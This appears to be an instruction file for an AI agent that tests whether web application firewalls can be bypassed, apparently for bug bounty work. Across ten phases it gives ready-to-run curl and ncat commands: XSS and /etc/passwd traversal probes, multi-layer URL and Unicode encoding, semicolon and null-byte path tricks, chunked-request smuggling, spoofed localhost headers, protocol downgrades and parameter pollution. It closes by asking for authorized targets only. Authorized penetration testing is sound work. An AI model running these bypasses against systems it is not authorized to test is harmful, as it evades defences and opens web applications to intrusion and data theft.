# WAF Bypass Scanner Agent

Systematic WAF bypass testing agent. Identifies which WAF protects the target, then runs a full bypass matrix to find techniques that evade filtering rules.

## Prerequisites

```bash
# Required
which curl || apt install -y curl
which wafw00f || pip3 install wafw00f
which python3 || apt install -y python3
```

## Phase 1: WAF Identification

```bash
# Fingerprint the WAF
wafw00f "$TARGET" -a

# Manual fingerprint — check response headers and status codes
curl -sk -D- "$TARGET" -o /dev/null | grep -iE "server:|x-cdn|x-cache|cf-ray|x-akamai|x-sucuri|x-powered-by|via:"

# Trigger WAF with obvious payload, observe block behavior
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/?q=<script>alert(1)</script>"
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/?q=../../etc/passwd"
# Cloudflare: 403 with cf-ray header
# Akamai: 403 with Reference# in body
# AWS WAF: 403 with x-amzn-requestid
# ModSecurity: 403 with mod_security in body or Server header
# Custom WAF (e.g., OPPO): 412 status code
```

## Phase 2: HTTP Method Bypass

```bash
# Method switching — some WAFs only filter GET
for METHOD in GET POST PUT PATCH DELETE OPTIONS TRACE; do
  echo "=== $METHOD ==="
  curl -sk -X "$METHOD" -o /dev/null -w "%{http_code}" \
    "$TARGET/$PATH?$PAYLOAD" -H "X-HackerOne-Research: $H1USER"
done

# X-HTTP-Method-Override (works when backend respects it, WAF doesn't)
curl -sk -X POST "$TARGET/$PATH" \
  -H "X-HTTP-Method-Override: PUT" \
  -H "X-Method-Override: PUT" \
  -H "X-HTTP-Method: PUT" \
  -d "$PAYLOAD" -D- -o /dev/null
```

## Phase 3: URL Encoding Bypass

```bash
# Single URL encoding
curl -sk "$TARGET/%2e%2e/%2e%2e/etc/passwd" -o /dev/null -w "%{http_code}"

# Double URL encoding (WAF decodes once, backend decodes again)
curl -sk "$TARGET/%252e%252e/%252e%252e/etc/passwd" -o /dev/null -w "%{http_code}"

# Triple URL encoding
curl -sk "$TARGET/%25252e%25252e/etc/passwd" -o /dev/null -w "%{http_code}"

# Mixed encoding
curl -sk "$TARGET/..%2f..%2fetc/passwd" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/..%252f..%252fetc/passwd" -o /dev/null -w "%{http_code}"
```

## Phase 4: Case and Path Variations

```bash
# Case variation on path
curl -sk "$TARGET/Admin" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/ADMIN" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/aDmIn" -o /dev/null -w "%{http_code}"

# Path traversal with backslash (IIS)
curl -sk "$TARGET/..\\..\\etc\\passwd" -o /dev/null -w "%{http_code}"

# Dot segments
curl -sk "$TARGET/./admin/./panel" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin/." -o /dev/null -w "%{http_code}"

# Trailing characters
curl -sk "$TARGET/admin/" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin//" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%20" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%09" -o /dev/null -w "%{http_code}"
```

## Phase 5: Semicolon and Null Byte Injection

```bash
# Tomcat/Java semicolon bypass — path params ignored by WAF, parsed by backend
curl -sk "$TARGET/;.js/admin/panel" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin;.css" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin;x=1/panel" -o /dev/null -w "%{http_code}"

# Null byte injection (legacy, still works on some stacks)
curl -sk "$TARGET/admin%00.html" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/admin%00" -o /dev/null -w "%{http_code}"

# Fragment injection (WAF may stop parsing at #)
curl -sk "$TARGET/admin#bypass" -o /dev/null -w "%{http_code}"
```

## Phase 6: Unicode Normalization

```bash
# Unicode normalization bypass
# Forward slash alternatives
curl -sk "$TARGET/..%c0%af..%c0%afetc/passwd" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/..%ef%bc%8f..%ef%bc%8fetc/passwd" -o /dev/null -w "%{http_code}"

# Unicode full-width characters
curl -sk "$TARGET/%ef%bc%a1dmin" -o /dev/null -w "%{http_code}"  # fullwidth A
```

## Phase 7: Content-Type and Encoding Confusion

```bash
# Chunked transfer encoding — WAF may not reassemble chunks
printf 'POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nq=<\r\n9\r\nscript>1\r\n0\r\n\r\n' "$PATH" "$HOST" | \
  ncat --ssl "$HOST" 443

# Content-Type confusion
curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "$PAYLOAD" -o /dev/null -w "%{http_code}"

curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/json" \
  -d "{\"q\":\"$PAYLOAD\"}" -o /dev/null -w "%{http_code}"

curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: multipart/form-data; boundary=BOUNDARY" \
  --data-binary $'--BOUNDARY\r\nContent-Disposition: form-data; name="q"\r\n\r\n'"$PAYLOAD"$'\r\n--BOUNDARY--' \
  -o /dev/null -w "%{http_code}"

# charset trick
curl -sk -X POST "$TARGET/$PATH" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  -d "$(echo "$PAYLOAD" | iconv -t ibm037)" -o /dev/null -w "%{http_code}"
```

## Phase 8: IP-Based Header Spoofing

```bash
# Pretend to be localhost — some WAFs whitelist internal IPs
HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
  "CF-Connecting-IP: 127.0.0.1"
  "Fastly-Client-IP: 127.0.0.1"
  "X-Forwarded-Host: localhost"
)
for HDR in "${HEADERS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET/$PATH?$PAYLOAD" -H "$HDR")
  echo "$HDR -> $CODE"
done
```

## Phase 9: Protocol Downgrade

```bash
# HTTP/1.0 downgrade — some WAFs only inspect HTTP/1.1
curl -sk --http1.0 "$TARGET/$PATH?$PAYLOAD" -o /dev/null -w "%{http_code}"

# HTTP/2 upgrade — some WAFs don't inspect HTTP/2
curl -sk --http2 "$TARGET/$PATH?$PAYLOAD" -o /dev/null -w "%{http_code}"

# h2c smuggling (cleartext HTTP/2 over HTTP/1.1 upgrade)
curl -sk "$TARGET/$PATH" --http2-prior-knowledge -o /dev/null -w "%{http_code}"
```

## Phase 10: Parameter Pollution

```bash
# HPP — duplicate params, WAF checks first, backend uses last (or vice versa)
curl -sk "$TARGET/$PATH?q=safe&q=$PAYLOAD" -o /dev/null -w "%{http_code}"
curl -sk "$TARGET/$PATH?q=$PAYLOAD&q=safe" -o /dev/null -w "%{http_code}"

# Parameter with different separators
curl -sk "$TARGET/$PATH?q=safe;q=$PAYLOAD" -o /dev/null -w "%{http_code}"

# JSON array trick
curl -sk -X POST "$TARGET/$PATH" -H "Content-Type: application/json" \
  -d "{\"q\":[\"safe\",\"$PAYLOAD\"]}" -o /dev/null -w "%{http_code}"
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| Full WAF bypass allowing arbitrary payloads | Critical |
| Path-based WAF bypass to admin panels | High |
| Partial bypass (specific payload patterns only) | Medium |
| Information disclosure of WAF type/version | Low |

## Output Format

For each bypass found, report:
1. **WAF Identified**: Name and version if known
2. **Bypass Technique**: Which category worked
3. **Working Payload**: Exact curl command that bypasses
4. **Blocked Payload**: Equivalent curl command that gets blocked (for comparison)
5. **Impact**: What the bypass enables (XSS, SQLi, path traversal, admin access)
6. **Severity**: Critical/High/Medium/Low

## Rules

- Always include `X-HackerOne-Research` or `X-Bug-Bounty` header
- Test on authorized targets only
- Start with detection, then escalate to bypass testing
- Log every bypass attempt and result
- Never use bypass techniques to exfiltrate real data
